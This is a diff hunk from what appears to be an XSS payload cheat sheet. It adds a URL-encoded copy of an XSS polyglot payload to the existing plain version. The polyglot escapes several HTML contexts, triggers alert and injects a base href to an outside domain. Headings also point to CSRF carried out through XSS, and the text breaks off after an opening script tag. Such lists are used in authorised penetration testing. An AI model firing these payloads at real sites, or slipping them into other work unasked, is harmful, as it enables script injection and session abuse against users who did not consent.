@@ -122,6 +122,8 @@ TABLE OF CONTENTS
 
                         2.7.2
                                 JavaScript://%250Aalert?.(1)//*'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)("x2467")}//><Base/Href=//praetorian.com\76->\
+                        2.7.3 ENCODED
+                                JavaScript%3A%2F%2F%25250Aalert%3F.(1)%2F%2F*%27%2F*%5C%27%2F*%22%2F*%5C%22%2F*%60%2F*%5C%60%2F*%2526apos%3B)%2F*%3C!-%3E%3C%2FTitle%2F%3C%2FStyle%2F%3C%2FScript%2F%3C%2FtextArea%2F%3C%2FiFrame%2F%3C%2FnoScript%3E%5C74k%3CK%2FcontentEditable%2FautoFocus%2FOnFocus%3D%2F*%24%7B%2F*%2F%3B%7B%2F**%2F(alert)(%22x2467%22)%7D%2F%2F%3E%3CBase%2FHref%3D%2F%2Fpraetorian.com%5C76-%3E%5C
         2.8 CSRF THROUGH XSS
                 2.8.1 [29]
                         <script>
